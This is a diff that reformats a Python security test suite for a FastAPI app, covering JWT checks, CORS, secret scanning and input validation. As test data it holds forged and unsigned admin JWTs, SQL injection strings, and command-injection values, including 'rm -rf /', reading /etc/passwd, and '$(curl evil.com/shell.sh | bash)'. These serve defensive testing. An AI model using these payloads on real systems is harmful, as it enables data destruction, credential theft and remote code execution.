@@ -12,6 +12,7 @@ from unittest.mock import patch, MagicMock
 from fastapi.testclient import TestClient
 from fastapi import FastAPI, HTTPException
 
+
 # Test fixtures for JWT tokens
 def create_valid_token(secret: str = "test-secret-key", exp_minutes: int = 60) -> str:
     """Create a valid JWT token for testing."""
@@ -20,7 +21,7 @@ def create_valid_token(secret: str = "test-secret-key", exp_minutes: int = 60) -
         "email": "test@example.com",
         "role": "authenticated",
         "iat": datetime.now(timezone.utc),
-        "exp": datetime.now(timezone.utc) + timedelta(minutes=exp_minutes)
+        "exp": datetime.now(timezone.utc) + timedelta(minutes=exp_minutes),
     }
     return jwt.encode(payload, secret, algorithm="HS256")
 
@@ -32,7 +33,7 @@ def create_invalid_token() -> str:
         "email": "hacker@evil.com",
         "role": "admin",
         "iat": datetime.now(timezone.utc),
-        "exp": datetime.now(timezone.utc) + timedelta(minutes=60)
+        "exp": datetime.now(timezone.utc) + timedelta(minutes=60),
     }
     # Sign with wrong secret
     return jwt.encode(payload, "wrong-secret", algorithm="HS256")
@@ -45,7 +46,7 @@ def create_expired_token(secret: str = "test-secret-key") -> str:
         "email": "test@example.com",
         "role": "authenticated",
         "iat": datetime.now(timezone.utc) - timedelta(hours=25),
-        "exp": datetime.now(timezone.utc) - timedelta(hours=1)  # Expired
+        "exp": datetime.now(timezone.utc) - timedelta(hours=1),  # Expired
     }
     return jwt.encode(payload, secret, algorithm="HS256")
 
@@ -59,12 +60,19 @@ def create_no_signature_token() -> str:
         "email": "attacker@evil.com",
         "role": "admin",
         "iat": datetime.now(timezone.utc),
-        "exp": datetime.now(timezone.utc) + timedelta(minutes=60)
+        "exp": datetime.now(timezone.utc) + timedelta(minutes=60),
     }
     # Manually construct token without signature
     import base64
-    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
-    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, default=str).encode()).rstrip(b'=').decode()
+
+    header_b64 = (
+        base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
+    )
+    payload_b64 = (
+        base64.urlsafe_b64encode(json.dumps(payload, default=str).encode())
+        .rstrip(b"=")
+        .decode()
+    )
     return f"{header_b64}.{payload_b64}."
 
 
@@ -86,15 +94,17 @@ class TestJWTAuthentication:
         """Test that JWT signature validation is properly enabled."""
         from middleware.auth_middleware import AuthenticationMiddleware
 
-        with patch('middleware.auth_middleware.get_settings', return_value=mock_settings):
+        with patch(
+            "middleware.auth_middleware.get_settings", return_value=mock_settings
+        ):
             middleware = AuthenticationMiddleware(MagicMock())
 
             # Test with valid token
             valid_token = create_valid_token(mock_settings.jwt_secret)
             result = pytest.helpers.run_async(middleware._validate_token(valid_token))
             assert result is not None
-            assert result['authenticated'] == True
-            assert result['user_id'] == "test-user-123"
+            assert result["authenticated"] == True
+            assert result["user_id"] == "test-user-123"
 
             # Test with invalid signature
             invalid_token = create_invalid_token()
@@ -105,7 +115,9 @@ class TestJWTAuthentication:
         """Test JWT expiration is properly validated."""
         from middleware.auth_middleware import AuthenticationMiddleware
 
-        with patch('middleware.auth_middleware.get_settings', return_value=mock_settings):
+        with patch(
+            "middleware.auth_middleware.get_settings", return_value=mock_settings
+        ):
             middleware = AuthenticationMiddleware(MagicMock())
 
             # Test with expired token
@@ -117,7 +129,9 @@ class TestJWTAuthentication:
         """Test prevention of JWT 'none' algorithm attack."""
         from middleware.auth_middleware import AuthenticationMiddleware
 
-        with patch('middleware.auth_middleware.get_settings', return_value=mock_settings):
+        with patch(
+            "middleware.auth_middleware.get_settings", return_value=mock_settings
+        ):
             middleware = AuthenticationMiddleware(MagicMock())
 
             # Test with no-signature token (none algorithm)
@@ -129,7 +143,9 @@ class TestJWTAuthentication:
         """Test that required JWT claims are validated."""
         from middleware.auth_middleware import AuthenticationMiddleware
 
-        with patch('middleware.auth_middleware.get_settings', return_value=mock_settings):
+        with patch(
+            "middleware.auth_middleware.get_settings", return_value=mock_settings
+        ):
             middleware = AuthenticationMiddleware(MagicMock())
 
             # Token missing 'sub' claim
@@ -137,7 +153,7 @@ class TestJWTAuthentication:
                 "email": "test@example.com",
                 "role": "authenticated",
                 "iat": datetime.now(timezone.utc),
-                "exp": datetime.now(timezone.utc) + timedelta(minutes=60)
+                "exp": datetime.now(timezone.utc) + timedelta(minutes=60),
             }
             token = jwt.encode(payload, mock_settings.jwt_secret, algorithm="HS256")
             result = pytest.helpers.run_async(middleware._validate_token(token))
@@ -147,7 +163,9 @@ class TestJWTAuthentication:
         """Test JWT token age validation (24-hour limit)."""
         from middleware.auth_middleware import AuthenticationMiddleware
 
-        with patch('middleware.auth_middleware.get_settings', return_value=mock_settings):
+        with patch(
+            "middleware.auth_middleware.get_settings", return_value=mock_settings
+        ):
             middleware = AuthenticationMiddleware(MagicMock())
 
             # Token older than 24 hours but not expired
@@ -157,7 +175,8 @@ class TestJWTAuthentication:
                 "email": "test@example.com",
                 "role": "authenticated",
                 "iat": old_iat,
-                "exp": datetime.now(timezone.utc) + timedelta(minutes=10)  # Still valid
+                "exp": datetime.now(timezone.utc)
+                + timedelta(minutes=10),  # Still valid
             }
             old_token = jwt.encode(payload, mock_settings.jwt_secret, algorithm="HS256")
             result = pytest.helpers.run_async(middleware._validate_token(old_token))
@@ -173,11 +192,13 @@ class TestCORSConfiguration:
         from main import create_application
 
         # Test production settings don't allow wildcards
-        with patch.dict('os.environ', {'ENVIRONMENT': 'production'}):
+        with patch.dict("os.environ", {"ENVIRONMENT": "production"}):
             settings = Settings()
             assert "*" not in settings.allowed_origins
-            assert "http://localhost:3000" in settings.allowed_origins or \
-                   len(settings.allowed_origins) > 0
+            assert (
+                "http://localhost:3000" in settings.allowed_origins
+                or len(settings.allowed_origins) > 0
+            )
 
     def test_cors_specific_origins_configured(self):
         """Test that specific origins are properly configured."""
@@ -188,13 +209,16 @@ class TestCORSConfiguration:
         # Check CORS middleware configuration
         cors_middleware = None
         for middleware in app.middleware:
-            if hasattr(middleware, 'cls') and middleware.cls.__name__ == 'CORSMiddleware':
+            if (
+                hasattr(middleware, "cls")
+                and middleware.cls.__name__ == "CORSMiddleware"
+            ):
                 cors_middleware = middleware
                 break
 
         assert cors_middleware is not None
         # Verify no wildcard in allow_origins
-        assert "*" not in middleware.options.get('allow_origins', [])
+        assert "*" not in middleware.options.get("allow_origins", [])
 
     def test_cors_headers_properly_configured(self):
         """Test CORS headers are properly configured."""
@@ -204,14 +228,17 @@ class TestCORSConfiguration:
 
         # Find CORS middleware configuration
         for middleware in app.middleware:
-            if hasattr(middleware, 'cls') and middleware.cls.__name__ == 'CORSMiddleware':
+            if (
+                hasattr(middleware, "cls")
+                and middleware.cls.__name__ == "CORSMiddleware"
+            ):
                 options = middleware.options
                 # Check explicit headers (no wildcards)
-                assert "*" not in options.get('allow_headers', [])
-                assert "Authorization" in options.get('allow_headers', [])
+                assert "*" not in options.get("allow_headers", [])
+                assert "Authorization" in options.get("allow_headers", [])
                 # Check explicit methods
-                assert "*" not in options.get('allow_methods', [])
-                assert "GET" in options.get('allow_methods', [])
+                assert "*" not in options.get("allow_methods", [])
+                assert "GET" in options.get("allow_methods", [])
                 break
 
 
@@ -228,24 +255,24 @@ class TestSecretsManagement:
             r'api[_-]?key\s*=\s*["\']sk-[a-zA-Z0-9]{20,}',  # OpenAI keys
             r'password\s*=\s*["\'][^"\']+["\']',  # Hardcoded passwords
             r'secret[_-]?key\s*=\s*["\'][^"\']+["\']',  # Secret keys
-            r'token\s*=\s*["\'][a-zA-Z0-9]{20,}["\']'  # Hardcoded tokens
+            r'token\s*=\s*["\'][a-zA-Z0-9]{20,}["\']',  # Hardcoded tokens
         ]
 
         # Files to check (exclude test files)
         code_files = []
-        for root, dirs, files in os.walk('.'):
+        for root, dirs, files in os.walk("."):
             # Skip test directories
-            if 'test' in root or '__pycache__' in root or 'venv' in root:
+            if "test" in root or "__pycache__" in root or "venv" in root:
                 continue
             for file in files:
-                if file.endswith('.py'):
+                if file.endswith(".py"):
                     code_files.append(os.path.join(root, file))
 
         violations = []
         for filepath in code_files:
             if not os.path.exists(filepath):
                 continue
-            with open(filepath, 'r') as f:
+            with open(filepath, "r") as f:
                 content = f.read()
                 for pattern in secret_patterns:
                     if re.search(pattern, content):
@@ -260,27 +287,35 @@ class TestSecretsManagement:
 
         # Test with environment variables
         test_env = {
-            'JWT_SECRET': 'test-jwt-secret-from-env',
-            'SUPABASE_ANON_KEY': 'test-supabase-key-from-env',
-            'OPENAI_API_KEY': 'sk-test-from-env'
+            "JWT_SECRET": "test-jwt-secret-from-env",
+            "SUPABASE_ANON_KEY": "test-supabase-key-from-env",
+            "OPENAI_API_KEY": "sk-test-from-env",
         }
 
-        with patch.dict('os.environ', test_env, clear=False):
+        with patch.dict("os.environ", test_env, clear=False):
             settings = Settings()
-            assert settings.jwt_secret == 'test-jwt-secret-from-env'
-            assert settings.supabase_anon_key == 'test-supabase-key-from-env'
+            assert settings.jwt_secret == "test-jwt-secret-from-env"
+            assert settings.supabase_anon_key == "test-supabase-key-from-env"
 
     def test_gitignore_configured_properly(self):
         """Test that .gitignore properly excludes sensitive files."""
-        expected_patterns = ['.env', '*.key', '*.pem', '*.p12', 'secrets/', 'credentials/']
+        expected_patterns = [
+            ".env",
+            "*.key",
+            "*.pem",
+            "*.p12",
+            "secrets/",
+            "credentials/",
+        ]
 
-        gitignore_path = '.gitignore'
+        gitignore_path = ".gitignore"
         if os.path.exists(gitignore_path):
-            with open(gitignore_path, 'r') as f:
+            with open(gitignore_path, "r") as f:
                 content = f.read()
                 for pattern in expected_patterns:
-                    assert pattern in content or pattern.strip('*') in content, \
-                        f"Pattern {pattern} not found in .gitignore"
+                    assert (
+                        pattern in content or pattern.strip("*") in content
+                    ), f"Pattern {pattern} not found in .gitignore"
 
 
 class TestInputValidation:
@@ -298,7 +333,7 @@ class TestInputValidation:
             "1 OR 1=1",
             "' UNION SELECT * FROM passwords --",
             "admin' --",
-            "1; DELETE FROM documents WHERE 1=1"
+            "1; DELETE FROM documents WHERE 1=1",
         ]
 
         for payload in sql_payloads:
@@ -340,7 +375,7 @@ class TestInputValidation:
             "| whoami",
             "&& rm -rf /",
             "`cat /etc/passwd`",
-            "$(curl evil.com/shell.sh | bash)"
+            "$(curl evil.com/shell.sh | bash)",
         ]
 
         for payload in cmd_payloads:
@@ -403,7 +438,7 @@ class TestSecurityHeaders:
         from fastapi import Request, Response
 
         # Test production CSP
-        with patch('middleware.security_middleware.get_settings') as mock_settings:
+        with patch("middleware.security_middleware.get_settings") as mock_settings:
             mock_settings.return_value.environment = "production"
 
             middleware = SecurityMiddleware(MagicMock())
@@ -422,7 +457,7 @@ class TestSecurityHeaders:
         from middleware.security_middleware import SecurityMiddleware
         from fastapi import Request, Response
 
-        with patch('middleware.security_middleware.get_settings') as mock_settings:
+        with patch("middleware.security_middleware.get_settings") as mock_settings:
             mock_settings.return_value.environment = "production"
 
             middleware = SecurityMiddleware(MagicMock())
@@ -443,6 +478,7 @@ class PytestHelpers:
     def run_async(coro):
         """Helper to run async functions in tests."""
         import asyncio
+
         loop = asyncio.get_event_loop()
         return loop.run_until_complete(coro)
 
